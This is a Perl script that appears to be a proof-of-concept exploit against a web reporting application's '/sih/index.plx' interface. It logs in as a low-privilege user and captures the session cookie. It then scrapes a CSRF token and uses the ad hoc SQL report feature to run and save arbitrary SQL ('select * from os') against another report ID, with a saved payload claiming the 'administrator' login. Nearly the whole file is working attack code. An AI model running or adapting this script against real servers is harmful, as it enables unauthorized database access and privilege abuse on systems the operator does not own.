#!/usr/bin/env perl
use strict;
use Getopt::Std;
use vars qw/$opt_g/;


#
#  Login to the server and return the session
sub do_login {
	my $server = shift;
	my $user = shift;
	my $pass = shift;

	
	my $cmd="curl -s  -d'test=test' 'http://$server/sih/index.plx' -D- -o /dev/null -H 'Host: $server' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'DNT: 1' -H 'Connection: keep-alive' --data 'auth_server=-1&login=$user&password=$pass&callingform=index.plx&action=&DOPASSTHRU=1'";


	my @result = `$cmd`;
	#  MDP:   check yo errors
	my $session='';

	for my $res (0 .. $#result) {
		@result[$res] =~ m/^Set-Cookie:\s*CGISESSID\s*=\s*([a-z0-9]{5,});/ig;
		if  ($#+ > 0) {
			$session = $1;
			last;
		}
	}

	return $session;


}

# 'Navigates' to the adhoc screen and finds the csrf token
sub getAdhocScreen {
	my $server = shift;
	my $session = shift;

	my $cmd = "curl 'http://$server/sih/index.plx?module=XML.XMLBase&reportType=AdhocSQLCSV' -H 'Host: $server' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Referer: http://$server/sih/index.plx' -H 'Cookie: CGISESSID=$session' -H 'Connection: keep-alive'";

	my @result = `$cmd`;
	my $csrftoken='';


	for my $res (0 .. $#result) {
		@result[$res] =~ m/^\s*.*(csrftoken\s*=\s*)([a-z0-9]{5,})&/ig;
		if  ($#+ > 1) {
			$csrftoken = $2;
			last;
		}
	}


	return $csrftoken;
}

#  Executes a test query
sub executeQuery {
	my $server = shift;
	my $session = shift;
	my $csrfToken = shift;
	my $user = shift;
	my $reportID = shift;

	print "Executing query with $session\n";

	my $qry = 'select%20%2A%20from%20os';
	my $cmd = "curl 'http://$server/sih/index.plx' -H 'Host: $server' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'DNT: 1' -H 'Cookie: CGISESSID=$session' -H 'Connection: keep-alive' --data 'command=getData&disableCache=0&pageSize=25&sqltext=$qry&login=$user&currentPage=1&reportType=AdhocSQLCSV&reportLabel=SQL%20Report%20CSV&module=XML%2EXMLBase&reportInputID=$reportID&reportModule=AdhocSQLCSV&random=Thu%20Apr%2023%2017%3A04%3A28%20GMT%2D0400%202015&csv=1&csrftoken=$csrfToken'";

	my @result = `$cmd`;

	for my $res (0 .. $#result) {
 		print  @result[$res] ."\n";
 	};
	
}

#  Saves a test query
sub saveQuery {
	my $server = shift;
	my $session = shift;
	my $csrfToken = shift;
	my $user = shift;
	my $reportID = shift;

	print "Executing query with $session\n";

	my $qry = 'select%20%2A%20from%20os';
	my $cmd = "curl 'http://$server/sih/index.plx' -H 'Host: $server' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Cookie: CGISESSID=$session' -H 'Connection: keep-alive' --data 'pageSize=25&login=$user&csv=1&reportName=Tester$session&csrftoken=$csrfToken&input=%3Cinputdata%20module%3D%22AdhocSQLCSV%22%3E%0A%20%20%3Cschedule%20enabled%3D%22false%22%3E%0A%20%20%20%20%3CcacheDrilldowns%20enabled%3D%22false%22%2F%3E%0A%20%20%20%20%3Crecurrance%3E%0A%20%20%20%20%20%20%3Ctime%20run%3D%2210%3A0%22%2F%3E%0A%20%20%20%20%20%20%3Cpattern%20type%3D%22Daily%22%3E%0A%20%20%20%20%20%20%20%20%3Cdetail%3E7%3C%2Fdetail%3E%0A%20%20%20%20%20%20%3C%2Fpattern%3E%0A%20%20%20%20%20%20%3Cdaterange%20start%3D%2205%2F04%2F2015%2000%3A00%3A00%22%20end%3D%22Never%22%2F%3E%0A%20%20%20%20%3C%2Frecurrance%3E%0A%20%20%20%20%3Cdistlist%20todisk%3D%22true%22%20toemails%3D%22false%22%20custompathandname%3D%22%22%20format%3D%22CSV%22%2F%3E%0A%20%20%3C%2Fschedule%3E%0A%20%20%3Cparams%3E%0A%20%20%20%20%3Cparam%20name%3D%22pageSize%22%3E25%3C%2Fparam%3E%0A%20%20%20%20%3Cparam%20name%3D%22login%22%3Eadministrator%3C%2Fparam%3E%0A%20%20%20%20%3Cparam%20name%3D%22sqltext%22%3Eselect%20%2A%20from%20os%3B%3C%2Fparam%3E%0A%20%20%20%20%3Cparam%20name%3D%22currentPage%22%3E1%3C%2Fparam%3E%0A%20%20%20%20%3Cparam%20name%3D%22reportLabel%22%3ESQL%20Report%20CSV%3C%2Fparam%3E%0A%20%20%20%20%3Cparam%20name%3D%22reportName%22%3ETester%3C%2Fparam%3E%0A%20%20%20%20%3Cparam%20name%3D%22reportModule%22%3EAdhocSQLCSV%3C%2Fparam%3E%0A%20%20%20%20%3Cparam%20name%3D%22random%22%3EMon%20May%204%2010%3A00%3A14%20GMT%2D0400%202015%3C%2Fparam%3E%0A%20%20%20%20%3Cparam%20name%3D%22reportType%22%3EAdhocSQLCSV%3C%2Fparam%3E%0A%20%20%20%20%3Cparam%20name%3D%22module%22%3ENCIRC%2EAdhocSQLCSV%5FBC%3C%2Fparam%3E%0A%20%20%20%20%3Cparam%20name%3D%22csv%22%3E1%3C%2Fparam%3E%0A%20%20%3C%2Fparams%3E%0A%3C%2Finputdata%3E&command=saveInput&reportModule=AdhocSQLCSV&random=Mon%20May%204%2010%3A00%3A14%20GMT%2D0400%202015&reportLabel=SQL%20Report%20CSV&currentPage=1&reportType=CSV&module=XML%2EXMLBase&sqltext=select%20%2A%20from%20os%3B'";

	my @result = `$cmd`;

	for my $res (0 .. $#result) {
 		print  @result[$res] ."\n";
 	};
	
}

#
#  Main()
#  You must pass in the following:
#  -i ip address of sih 
#  -u username
#  -p password
#  -r reportid

#  you can figure out which usernames map to which report id's based on the following query
#select i.identity_name, r.report_name, r.id from SIH_IDENTITY i, SIH_REPORT_INPUT r where i.id=r.user_name

my %options = ();
getopts("i:u:r:p:", \%options);


my $s = '10.1.2.125';	#server
my $u = 'peon';			#username
my $p = 'peon';			#password
my $r = '2';			#reportID

if (defined $options{i}) {
	$s = $options{i};
} else {
	die ('The IP address of the server not passed in. (-i)');
}

if (defined $options{u}) {
	$u = $options{u};
} else {
	die ('username not  passed in. (-u)');
}

if (defined $options{p}) {
	$p = $options{p};
} else {
	die ('Password not  passed in. (-p)');
}

if (defined $options{r}) {
	$r = $options{r};
} else {
	die ('ReportID not  passed in. (-r)');
}


my $session = do_login($s, $u, $p);
if ($session eq '') {
	print "No session found. Exiting\n";
	exit 1;
}
my $screenToken = getAdhocScreen($s, $session);

if ($screenToken eq '') {
	print "No csrf token found.  Exiting.\n";
	exit 1;
}

executeQuery($s, $session, $screenToken, $u, $r);

saveQuery($s, $session, $screenToken, $u, $r);

